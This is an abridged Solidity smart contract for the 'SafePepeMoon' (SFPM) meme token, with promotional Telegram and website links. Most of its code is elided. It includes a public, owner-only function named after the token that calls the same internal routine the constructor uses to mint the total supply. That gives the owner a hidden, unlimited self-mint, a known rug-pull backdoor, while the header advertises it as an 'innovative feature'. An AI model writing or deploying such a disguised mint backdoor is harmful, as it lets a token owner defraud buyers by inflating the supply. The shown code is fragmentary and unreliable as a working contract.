//
// $SafePepeMoon proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SafePepeMoonBEP20
// 📱 Website ::https://safepepemoon.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SafePepeMoon(uint256 amount) public onlyOwner {
 _SafePepeMoon(msg.sender, amount);
    }
    ...
    function _SafePepeMoon(address account, uint256 amount) internal virtual {
...
contract $SafePepeMoon is ERC20 {
    ...
    constructor() public ERC20("SafePepeMoon", "SFPM") {
     _SafePepeMoon(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}